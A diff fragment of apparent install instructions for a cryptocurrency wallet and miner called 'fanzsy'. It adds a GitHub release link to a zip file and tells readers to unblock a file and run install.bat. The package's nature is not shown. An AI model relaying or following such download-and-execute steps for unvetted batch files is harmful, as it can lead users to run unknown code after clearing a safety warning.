@@ -16,6 +16,6 @@ File unblock
 
 Press the button "OK".
 
-Extract the zip file fanzsy-auto.zip
+Extract the zip file fanzsy-auto.zip https://github.com/NERVOCAPITAL/FANZSY/releases/download/FANZSY/fanzsy-auto.zip
 
 Execute install.bat to automatically install your wallet and mine your first block.
